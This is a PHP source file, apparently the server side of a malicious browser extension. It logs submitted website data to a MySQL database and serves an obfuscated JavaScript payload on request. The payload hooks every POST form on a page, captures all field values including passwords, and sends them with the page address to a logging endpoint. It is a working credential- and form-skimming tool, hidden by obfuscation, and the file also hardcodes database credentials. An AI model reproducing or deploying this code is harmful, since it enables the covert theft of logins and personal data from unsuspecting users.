<?php
    require_once("idiorm.php");
    
	ORM::configure('mysql:host=localhost;dbname=honeyData');
	ORM::configure('username', 'honeyMonitor');
	ORM::configure('password', 'Claudiu147!$&');

    $db = ORM::get_db();

    /*CREATE TABLE extensionLogger  (
        id int NOT NULL AUTO_INCREMENT,
        date DATETIME default CURRENT_TIMESTAMP,
        website varchar(255) NOT NULL,
        data varchar(1024),
        PRIMARY KEY (id)
    ); */

    if(isset($_POST['postForm'])) {
        try {

            //$txt = "test";
            //$myfile = file_put_contents('logs.txt', $txt.PHP_EOL, FILE_APPEND | LOCK_EX );

            $payLoad = ORM::for_table("extensionlogger")->create();
            $payLoad->website = $_POST["website"];
            $payLoad->data = $_POST["data"];
            $payLoad->save();

            echo json_encode(
                array(
                    'statusCode' => 200
                ));
        } 
        catch (Exception $e) {
            echo json_encode(
                array(
                    'statusCode' => 420
                ));
        }
        exit;
    }

    $loggerScript = "var _0x32d8=['closest','hidden','POST','value','append','checked','querySelectorAll','checkbox','selected','http://127.0.0.10/PHP/mtalogger.php','FORM','location','replace','type','addEventListener','join','hostname','options','website','elements','form','[type=\x22submit\x22]','data','object','onreadystatechange','pathname','postForm','length','submit','button','radio','name','disabled'];(function(_0x1700c2,_0x5b7d3a){var _0x32d825=function(_0x110505){while(--_0x110505){_0x1700c2['push'](_0x1700c2['shift']());}};_0x32d825(++_0x5b7d3a);}(_0x32d8,0x82));var _0x1105=function(_0x1700c2,_0x5b7d3a){_0x1700c2=_0x1700c2-0x12d;var _0x32d825=_0x32d8[_0x1700c2];return _0x32d825;};var _0x4a03ae=_0x1105,allForms=document['querySelectorAll']('form[method=\x22post\x22]');if(allForms[_0x4a03ae(0x14a)]>0x0)for(let form of allForms){var submitButton=form[_0x4a03ae(0x135)](_0x4a03ae(0x144))[0x0];submitButton[_0x4a03ae(0x13d)]('click',processForm);}function processForm(_0x5bdaa9){var _0x6ab91d=_0x4a03ae,_0x3ae703=_0x5bdaa9['target'][_0x6ab91d(0x12f)](_0x6ab91d(0x143));return formData=new FormData(),formData[_0x6ab91d(0x133)](_0x6ab91d(0x145),serialize(_0x3ae703)),formData['append'](_0x6ab91d(0x141),window[_0x6ab91d(0x13a)][_0x6ab91d(0x13f)]+window[_0x6ab91d(0x13a)][_0x6ab91d(0x148)]),formData['append'](_0x6ab91d(0x149),!![]),httpRequest=new XMLHttpRequest(),httpRequest[_0x6ab91d(0x147)]=function(_0x1ac085){},httpRequest['open'](_0x6ab91d(0x131),_0x6ab91d(0x138)),httpRequest['send'](formData),![];}var serialize=function(_0x4fa30b){var _0x2096d5=_0x4a03ae,_0x3e35c1,_0x48a90b,_0xadd0ac=[];if(typeof _0x4fa30b==_0x2096d5(0x146)&&_0x4fa30b['nodeName']==_0x2096d5(0x139)){var _0x55b1d8=_0x4fa30b[_0x2096d5(0x142)][_0x2096d5(0x14a)];for(var _0x5e4560=0x0;_0x5e4560<_0x55b1d8;_0x5e4560++){_0x3e35c1=_0x4fa30b['elements'][_0x5e4560];if(_0x3e35c1[_0x2096d5(0x12d)]&&!_0x3e35c1[_0x2096d5(0x12e)]&&_0x3e35c1[_0x2096d5(0x13c)]!=_0x2096d5(0x14c)&&_0x3e35c1[_0x2096d5(0x13c)]!='file'&&_0x3e35c1[_0x2096d5(0x13c)]!=_0x2096d5(0x130)&&_0x3e35c1[_0x2096d5(0x13c)]!='reset'&&_0x3e35c1[_0x2096d5(0x13c)]!=_0x2096d5(0x14b)){if(_0x3e35c1['type']=='select-multiple'){_0x48a90b=_0x4fa30b[_0x2096d5(0x142)][_0x5e4560]['options']['length'];for(var _0x4a99d8=0x0;_0x4a99d8<_0x48a90b;_0x4a99d8++){_0x3e35c1[_0x2096d5(0x140)][_0x4a99d8][_0x2096d5(0x137)]&&(_0xadd0ac[_0xadd0ac['length']]=encodeURIComponent(_0x3e35c1[_0x2096d5(0x12d)])+'='+encodeURIComponent(_0x3e35c1['options'][_0x4a99d8][_0x2096d5(0x132)]));}}else(_0x3e35c1['type']!=_0x2096d5(0x136)&&_0x3e35c1[_0x2096d5(0x13c)]!=_0x2096d5(0x14d)||_0x3e35c1[_0x2096d5(0x134)])&&(_0xadd0ac[_0xadd0ac[_0x2096d5(0x14a)]]=encodeURIComponent(_0x3e35c1[_0x2096d5(0x12d)])+'='+encodeURIComponent(_0x3e35c1[_0x2096d5(0x132)]));}}}return _0xadd0ac[_0x2096d5(0x13e)]('&')[_0x2096d5(0x13b)](/%20/g,'+');};";
                                    
    if(isset($_POST['getScript'])) {
        try {

            echo json_encode(
                array(
                    'statusCode' => 200,
                    'script' => $loggerScript
                ));
        } 
        catch (Exception $e) {
            echo json_encode(
                array(
                    'statusCode' => 420
                ));
        }
        exit;
    }